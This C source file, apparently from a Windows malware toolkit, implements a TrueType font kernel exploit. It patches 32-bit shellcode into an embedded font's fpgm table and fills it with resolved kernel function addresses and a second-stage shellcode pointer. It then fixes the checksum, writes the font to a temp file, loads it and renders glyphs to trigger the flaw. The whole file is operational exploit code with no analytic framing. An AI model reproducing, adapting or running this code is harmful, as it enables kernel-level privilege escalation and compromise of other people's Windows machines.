#include "ttf.h"

#pragma pack(push, 2)

typedef struct _TTFHeader
{
    char sfnt_version[4];
    int16_t numTables;
    int16_t searchRange;
    int16_t entrySelector;
    int16_t rangeShift;
} TTFHeader;

#define TAGSIZ 4
typedef struct _TableEntry
{
    char tagName[TAGSIZ];
    unsigned long checkSum;
    long ofs;
    long siz;
} TableEntry;

#pragma pack(pop)

void smtoi(short* sval)
{
    short retval;
    unsigned char* cp;

    cp = (unsigned char*)sval;
    retval = *cp++;
    retval <<= 8;
    retval += *cp;
    *sval = retval;
}

void litom(long* lval)
{
    long setval;
    int i;
    unsigned char* cp;

    setval = *lval;
    cp = (unsigned char*)lval;
    cp += 3;
    for (i = 0; i < 4; i++) {
        *cp-- = (char)(setval & 0xff);
        setval >>= 8;
    }
}

void lmtoi(long* lval)
{
    long retval;
    unsigned char* cp;
    int i;

    cp = (unsigned char*)lval;
    retval = (long)*cp++;
    for (i = 0; i < 3; i++) {
        retval <<=8;
        retval |= (long)*cp++;
    }
    *lval = retval;
}

unsigned long calchksum(char* buf, int siz)
{
    unsigned long* csp;
    unsigned long chksum;
    unsigned long lval;
    unsigned char pad[4];
    int i;
    int padsiz;
    unsigned char* cp;
    int csc;

    csp = (unsigned long*)buf;
    csc = siz / 4;
    chksum = 0;
    while (csc-- > 0) {
        lval = *csp++;
        lmtoi((long*)&lval);
        chksum += lval;
    }	
    padsiz = (siz+3)/4*4 - siz;

    if (padsiz) {
        cp = (unsigned char *)csp;
        i = 0;
        while (padsiz++ < 4) {
            __movsb(pad + (i++), cp++, 1);
            //pad[i++]=*cp++;
        }
        csp = (unsigned long*)pad;
        lval = *csp;
        lmtoi((long*)&lval);
        chksum += lval;
    }
    return chksum;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    return fn_DefWindowProcW(hWnd, message, wParam, lParam);
}

#include "ttf_sc_level0_x32.c"
//#include "ttf_sc_level0_x64.c"

BOOLEAN exploit_fire_ttf()
{
    BOOLEAN ret = 0;
    uint8_t* pTTFOrigBuffer = NULL;
    uint8_t* pTTFBuffer = NULL;
    TTFHeader* pTTFHeader;
    TableEntry *pTE, *pTEItr;
    TableEntry fpgmEntry;
    uint32_t fpgmEntryOffset = 0;
    int nEntry;
    LOGFONTW lf;
    HWND hWnd;
    WNDCLASSEXA wcex;
    wchar_t fontPath[MAX_PATH];
    wchar_t tempPath[MAX_PATH];
    HDC hDC;
    int fontSize;
    UINT16 z[] = {0, 1, 2, 3, 4, 5};
    int fontId;
    uint32_t n;
    HINSTANCE hInst;
    HFONT hFont, oldHFont;
    HANDLE tmpHFile;
    int res;
    wchar_t* ptr;
    int16_t numTables;
    uint8_t* pScLevel0;
    HMODULE hLib;
    DWORD outLen;
    int (*fnAddFontResourceExW)(LPCWSTR lpszFilename, DWORD fl, PVOID pdv);
    HFONT (*fnCreateFontIndirectW)(CONST LOGFONTW* lplf);
    HGDIOBJ (*fnSelectObject)(HDC hdc, HGDIOBJ hgdiobj);
    BOOL (*fnExtTextOutW)(HDC hdc, int X, int Y, UINT fuOptions, CONST RECT* lprc, UINT cbCount, CONST INT* lpDx);
    BOOL (*fnDeleteObject)(HGDIOBJ hObject);
    BOOL (*fnGdiFlush)(VOID);
    BOOL (*fnRemoveFontResourceExW)(LPCWSTR lpFileName, DWORD fl, PVOID pdv);
    ULONG rdnSeed = fn_GetTickCount();

    DbgMsg("exploit_fire_ttf() start");

    tempPath[0] = L'\0';

    do {
        if (globalData.gSysInfo.isWow64) {
            DbgMsg("Unsupported OS");
            break;
        }

        if (utils_lzma_decompress(ttf_bin, sizeof(ttf_bin), (pvoid_t*)&pTTFOrigBuffer, &outLen) != 0) {
            DbgMsg("Can't decompress TTF font");
            break;
        }

        pTTFBuffer = fn_VirtualAlloc(NULL, outLen, MEM_COMMIT, PAGE_READWRITE);
        if (pTTFBuffer == NULL) {
            return 0;
        }

        __movsb(pTTFBuffer, pTTFOrigBuffer, outLen);

        pTTFHeader = (TTFHeader*)pTTFBuffer;
        pTEItr = pTE = (TableEntry*)(pTTFBuffer + sizeof(TTFHeader));

        smtoi(&pTTFHeader->numTables);
        smtoi(&pTTFHeader->searchRange);
        smtoi(&pTTFHeader->entrySelector);
        smtoi(&pTTFHeader->rangeShift);

        numTables = pTTFHeader->numTables;
        nEntry = numTables;

        for (pTEItr = pTE; nEntry-- > 0; ++pTEItr) {
            lmtoi((long*)&pTEItr->checkSum);
            lmtoi(&pTEItr->ofs);
            lmtoi(&pTEItr->siz);

            if (fn_RtlCompareMemory(pTEItr->tagName, "fpgm", TAGSIZ) == TAGSIZ) {
                fpgmEntryOffset = (uint32_t)((uint8_t*)pTEItr - pTTFBuffer);
                __movsb((uint8_t*)&fpgmEntry, pTEItr, sizeof(TableEntry));
            }
        }

        if (fpgmEntryOffset == 0) {
            DbgMsg("Can't found fpgm offset");
            break;
        }

        //fpgmDataTableOffset = pFPGMEntry->ofs + 0x50; // attack vector.

        __movsb(pTTFBuffer, pTTFOrigBuffer, outLen);

        pScLevel0 = pTTFBuffer + fpgmEntry.ofs + 0x50;
        if (globalData.gSysInfo.isWow64) {
            __stosw(pScLevel0, 0x03CD, 1024);
    //         gShellcode = (uint8_t*)VirtualAlloc(NULL, sizeof(sc_r0_payload_x64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //         __movsb(gShellcode, sc_r0_payload_x64, sizeof(sc_r0_payload_x64));
    // 
    //         utils_fix_32value(gShellcode, sizeof(sc_r0_payload_x64), 0xAAAAAAAA, (uint32_t)gSysInfo.osMajorVer);
    //         utils_fix_32value(gShellcode, sizeof(sc_r0_payload_x64), 0xBBBBBBBB, (uint32_t)gSysInfo.osMinorVer);
    // 
    //         utils_fix_64value(gShellcode, sizeof(sc_r0_payload_x64), 0xCCCCCCCCCCCCCCCCULL, (uint64_t)fnPsTerminateSystemThread);
    //         utils_fix_64value(gShellcode, sizeof(sc_r0_payload_x64), 0xDDDDDDDDDDDDDDDDULL, (uint64_t)fnObfReferenceObject);
    //         utils_fix_64value(gShellcode, sizeof(sc_r0_payload_x64), 0xEEEEEEEEEEEEEEEEULL, (uint64_t)fnKeDelayExecutionThread);
    //         utils_fix_64value(gShellcode, sizeof(sc_r0_payload_x64), 0xEEEEEEEEFFFFFFFFULL, (uint64_t)fnIoGetCurrentProcess);
    //         utils_fix_64value(gShellcode, sizeof(sc_r0_payload_x64), 0xAAAAAAAABBBBBBBBULL, (uint64_t)fn_stricmp);
    //         // Адрес ExAllocatePoolWithTag должен найти шеллкод целевого эксплоита.
    //         //utils_fix_64value(gShellcode, sizeof(sc_zk_loader_x32), 0xBBBBBBBBBBBBBBBBULL, (uint64_t)fnExAllocatePoolWithTag);
    //         //        utils_fix_64value(gShellcode, sizeof(sc_zk_loader_x32), 0xCCCCCCCCCCCCCCCCULL, (uint64_t)g_tmpPath);
        }
        else {
            __movsb(pScLevel0, ttf_sc_level0_x32, sizeof(ttf_sc_level0_x32));

            utils_fix_32value(pScLevel0, sizeof(ttf_sc_level0_x32), 0xAAAAAAAA, (uint32_t)fn_GetCurrentProcessId());
            utils_fix_32value(pScLevel0, sizeof(ttf_sc_level0_x32), 0xBBBBBBBB, (uint32_t)globalData.gLevel1Shellcode);

            utils_fix_32value(pScLevel0, sizeof(ttf_sc_level0_x32), 0xCCCCCCCC, (uint32_t)exploit_get_kernel_address(hKernel, kernelBase, "PsLookupProcessByProcessId"));
            utils_fix_32value(pScLevel0, sizeof(ttf_sc_level0_x32), 0xDDDDDDDD, (uint32_t)exploit_get_kernel_address(hKernel, kernelBase, "KeStackAttachProcess"));
            utils_fix_32value(pScLevel0, sizeof(ttf_sc_level0_x32), 0xEEEEEEEE, (uint32_t)exploit_get_kernel_address(hKernel, kernelBase, "KeUnstackDetachProcess"));
        }

        ((TableEntry*)(pTTFBuffer + fpgmEntryOffset))->checkSum = calchksum(pTTFBuffer + fpgmEntry.ofs, fpgmEntry.siz);

        __stosb((uint8_t*)fontPath, 0, MAX_PATH*2);

        n = fn_GetTempPathW(MAX_PATH, fontPath);

        do {
            if (n > 0) {
                n = fn_GetLongPathNameW(fontPath, fontPath, MAX_PATH);
                if (n > 0) {
                    if (fontPath[fn_lstrlenW(fontPath) - 1] != L'\\') {
                        fn_lstrcatW(fontPath, L"\\");
                    }
                    break;
                }
            }

            fn_lstrcpyW(fontPath, L"C:\\Windows\\Temp\\");
        } while (0);

        fn_GetTempFileNameW(fontPath, L"abcdefghijklmnopq", 1 + (fn_RtlRandomEx(&rdnSeed) % 256256), tempPath);

        ptr = tempPath + fn_lstrlenW(tempPath);
        for ( ; *ptr != L'.'; --ptr);
        __movsb(++ptr, L"ttf", 4 * sizeof(wchar_t));

        tmpHFile = fn_CreateFileW(tempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (tmpHFile == INVALID_HANDLE_VALUE) {
            DbgMsg("Can't create temp file for TTF font %d", fn_GetLastError());
            break;
        }

        res = fn_WriteFile(tmpHFile, pTTFBuffer, outLen, &n, NULL);
        if (!res || n != outLen) {
            DbgMsg("Can't write TTF font to file %d", fn_GetLastError());
            break;
        }

        fn_CloseHandle(tmpHFile);

        hLib = fn_LoadLibraryA("gdi32.dll");
        fnAddFontResourceExW = PeGetProcAddress(hLib,"AddFontResourceExW", FALSE);
        fnCreateFontIndirectW = PeGetProcAddress(hLib,"CreateFontIndirectW", FALSE);
        fnSelectObject = PeGetProcAddress(hLib,"SelectObject", FALSE);
        fnExtTextOutW = PeGetProcAddress(hLib,"ExtTextOutW", FALSE);
        fnDeleteObject = PeGetProcAddress(hLib,"DeleteObject", FALSE);
        fnGdiFlush = PeGetProcAddress(hLib,"GdiFlush", FALSE);
        fnRemoveFontResourceExW = PeGetProcAddress(hLib,"RemoveFontResourceExW", FALSE);

        fontId = fnAddFontResourceExW(tempPath, FR_PRIVATE, NULL);

        if (fontId == 0) {
            DbgMsg("fnAddFontResourceExW failed %d", fn_GetLastError());
            break;
        }

        hInst = fn_GetModuleHandleW(NULL);

        __stosb(&wcex, 0, sizeof(WNDCLASSEXA));
        wcex.cbSize = sizeof(WNDCLASSEXA);
        wcex.style = CS_HREDRAW | CS_VREDRAW;
        wcex.lpfnWndProc = WndProc;
        wcex.hInstance = hInst;
        wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wcex.lpszClassName = "stw";

        fn_RegisterClassExA(&wcex);

        hWnd = fn_CreateWindowExA(WS_EX_TOPMOST|WS_EX_NOACTIVATE, "stw", "ttfe", WS_POPUP, 0, 0, 1, 1, NULL, NULL, hInst, NULL);
        if (hWnd == NULL) {
            DbgMsg("fn_CreateWindowExA failed %d", fn_GetLastError());
            break;
        }

        hDC = fn_GetDC(hWnd);
        fontSize = 4;
        //for (fontSize = 0; fontSize < 10000; ++fontSize)
        {
            lf.lfHeight = fontSize;
            fn_lstrcpyW(lf.lfFaceName, L"Dexter");
            lf.lfWidth=0;
            lf.lfEscapement=0;
            lf.lfOrientation=0;
            lf.lfWeight=FW_NORMAL;
            lf.lfItalic=FALSE;
            lf.lfUnderline=FALSE;
            lf.lfStrikeOut=FALSE;
            lf.lfCharSet=DEFAULT_CHARSET;
            lf.lfOutPrecision=OUT_DEFAULT_PRECIS;
            lf.lfClipPrecision=CLIP_DEFAULT_PRECIS;
            lf.lfPitchAndFamily=DEFAULT_PITCH|FF_DONTCARE;

            hFont = fnCreateFontIndirectW(&lf);
            oldHFont = fnSelectObject(hDC, hFont);

            fnExtTextOutW(hDC, 7, 7, ETO_GLYPH_INDEX, NULL, z, 6, NULL);

            fnDeleteObject(fnSelectObject(hDC, oldHFont));
            fnGdiFlush();
            fnRemoveFontResourceExW(tempPath, FR_PRIVATE, NULL);
        }

        fn_ReleaseDC(hWnd, hDC);
        fn_DestroyWindow(hWnd);

        ret = 1;
    } while (0);

    if (tempPath[0] != L'\0') {
        fn_DeleteFileW(tempPath);
    }

    if (pTTFOrigBuffer != NULL) {
        fn_VirtualFree(pTTFBuffer, outLen, MEM_DECOMMIT);
    }

    if (pTTFBuffer != NULL) {
        fn_VirtualFree(pTTFBuffer, outLen, MEM_DECOMMIT);
    }

    DbgMsg("exploit_fire_ttf() end");

    return ret;
}
